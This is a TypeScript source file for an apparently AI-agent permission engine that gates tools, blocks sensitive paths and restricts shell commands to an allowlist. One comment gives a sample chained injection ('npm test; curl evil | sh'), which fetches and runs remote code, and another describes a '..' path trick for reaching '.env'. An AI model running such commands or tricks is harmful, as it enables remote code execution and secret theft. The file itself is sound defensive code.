import { posix as posixPath } from 'node:path';
import { minimatch } from 'minimatch';
import {
  DEFAULT_ALLOWED_COMMANDS,
  DEFAULT_BLOCKED_PATHS,
  DEFAULT_CONFIG,
  type ExcaliburConfig,
} from '@excalibur/shared';

/**
 * Permission engine (Build Contract §4.4, OSS spec §10.4 and §17,
 * onboarding spec §5 `standard-safe`).
 *
 * Pure decision logic — it never throws and never prompts. Callers turn
 * `requiresConfirmation` into an interactive question and `allowed: false`
 * into a `PermissionDeniedError` where appropriate.
 */

export type PermissionDecision = {
  allowed: boolean;
  requiresConfirmation: boolean;
  reason: string;
};

export type PermissionsConfig = ExcaliburConfig['permissions'];

type ToolFlag = boolean | 'ask';

/**
 * Fallback tool flags mirror `DEFAULT_CONFIG.permissions.tools` (single
 * source of truth): read-only tools allowed, mutating tools ask, network off.
 */
const FALLBACK_TOOL_FLAGS: Readonly<Record<string, ToolFlag>> =
  DEFAULT_CONFIG.permissions?.tools ?? {};

/** Unknown tools default to `ask` — the safe answer for anything unrecognized. */
const UNKNOWN_TOOL_FLAG: ToolFlag = 'ask';

const ALLOWED: PermissionDecision = Object.freeze({
  allowed: true,
  requiresConfirmation: false,
  reason: 'Allowed.',
});

function allow(reason: string): PermissionDecision {
  return { ...ALLOWED, reason };
}

function ask(reason: string): PermissionDecision {
  return { allowed: true, requiresConfirmation: true, reason };
}

function deny(reason: string): PermissionDecision {
  return { allowed: false, requiresConfirmation: false, reason };
}

/**
 * Normalizes a repository-relative path for matching (posix separators, no
 * leading `./`). CRITICALLY it COLLAPSES `..`/`.` segments first, so a blocked
 * pattern like `.env` still matches an evasion such as `src/../.env` — the
 * string handed to minimatch is the canonical path fs will actually open.
 */
function normalizeRelPath(relPath: string): string {
  const slashed = relPath.replace(/\\/g, '/').trim();
  // Guard the empty path: posix.normalize('') returns '.', which would slip
  // past the caller's empty-path denial — keep empty input empty.
  if (slashed.length === 0) {
    return '';
  }
  // posix.normalize collapses `a/../b` → `b`, `./x` → `x`, `a//b` → `a/b`.
  const collapsed = posixPath.normalize(slashed);
  return collapsed.replace(/^(\.\/)+/, '').replace(/^\/+/, '');
}

/** Collapses whitespace so `npm  test` matches the `npm test` allowlist entry. */
function normalizeCommand(command: string): string {
  return command.trim().replace(/\s+/g, ' ');
}

/** Shell control/metacharacters that enable chaining, pipes, subshells, redirection. */
const SHELL_METACHAR_RE = /[;&|`$<>\n()]/;
export function hasShellMetacharacters(command: string): boolean {
  return SHELL_METACHAR_RE.test(command);
}

export class PermissionEngine {
  private readonly toolFlags: Readonly<Record<string, ToolFlag>>;
  private readonly blockedPaths: ReadonlyArray<string>;
  private readonly allowedCommands: ReadonlyArray<string>;

  constructor(permissions?: PermissionsConfig) {
    // Per-tool overrides merge over the safe defaults; explicit blockedPaths /
    // allowedCommands lists replace the defaults entirely (the config loader
    // merges over DEFAULT_CONFIG, which carries the full default lists).
    this.toolFlags = { ...FALLBACK_TOOL_FLAGS, ...permissions?.tools };
    this.blockedPaths = permissions?.blockedPaths ?? DEFAULT_BLOCKED_PATHS;
    this.allowedCommands = permissions?.allowedCommands ?? DEFAULT_ALLOWED_COMMANDS;
  }

  private flagFor(tool: string): ToolFlag {
    return this.toolFlags[tool] ?? UNKNOWN_TOOL_FLAG;
  }

  /** Returns the first blocked-path pattern matching the path, if any. */
  private blockedBy(normalizedPath: string): string | undefined {
    return this.blockedPaths.find((pattern) =>
      minimatch(normalizedPath, pattern, { dot: true }),
    );
  }

  private commandIsAllowlisted(command: string): boolean {
    // A command carrying shell control/metacharacters (chaining, pipes, command
    // substitution, redirection) is NEVER auto-allowed: an allowlist glob like
    // `npm test*` must not green-light `npm test; curl evil | sh`. Such commands
    // fall through to confirmation regardless of the run_command flag.
    if (hasShellMetacharacters(command)) {
      return false;
    }
    return this.allowedCommands.some(
      (entry) =>
        normalizeCommand(entry) === command || minimatch(command, entry, { dot: true }),
    );
  }

  /**
   * Generic tool gate: `true` → allowed, `'ask'` → requires confirmation,
   * `false` → denied. Tools without a configured flag default to `'ask'`.
   */
  checkTool(tool: string): PermissionDecision {
    const flag = this.flagFor(tool);
    if (flag === false) {
      return deny(`Tool "${tool}" is disabled by permissions.tools.`);
    }
    if (flag === 'ask') {
      return ask(`Tool "${tool}" requires confirmation (permissions.tools is "ask").`);
    }
    return allow(`Tool "${tool}" is allowed by permissions.tools.`);
  }

  /**
   * Checks a repository-relative path against the blocked-path patterns
   * (minimatch, `dot: true`) and the read/write tool flags.
   */
  checkPath(relPath: string, op: 'read' | 'write'): PermissionDecision {
    const normalized = normalizeRelPath(relPath);
    if (normalized.length === 0) {
      return deny('Empty path.');
    }

    const blockedPattern = this.blockedBy(normalized);
    if (blockedPattern !== undefined) {
      return deny(`Path "${normalized}" is blocked by pattern "${blockedPattern}".`);
    }

    const tool = op === 'read' ? 'read_file' : 'write_file';
    const flag = this.flagFor(tool);
    if (flag === false) {
      return deny(`${op === 'read' ? 'Reading' : 'Writing'} files is disabled (${tool}: false).`);
    }
    if (flag === 'ask') {
      return ask(
        `${op === 'read' ? 'Reading' : 'Writing'} "${normalized}" requires confirmation (${tool}: "ask").`,
      );
    }
    return allow(`Path "${normalized}" is not blocked and ${tool} is allowed.`);
  }

  /**
   * Checks a shell command against the `run_command` tool flag and the
   * allowlist. Allowlisted commands follow the tool flag; commands outside
   * the allowlist always require confirmation (OSS spec §17: "ask before
   * running commands not in allowlist") unless the tool is disabled.
   */
  checkCommand(command: string): PermissionDecision {
    const normalized = normalizeCommand(command);
    if (normalized.length === 0) {
      return deny('Empty command.');
    }

    const flag = this.flagFor('run_command');
    if (flag === false) {
      return deny('Running commands is disabled (run_command: false).');
    }

    const allowlisted = this.commandIsAllowlisted(normalized);
    if (!allowlisted) {
      return ask(
        `Command "${normalized}" is not in the allowedCommands allowlist; confirmation required.`,
      );
    }
    if (flag === 'ask') {
      return ask(
        `Command "${normalized}" is allowlisted but run_command is "ask"; confirmation required.`,
      );
    }
    return allow(`Command "${normalized}" is in the allowedCommands allowlist.`);
  }
}
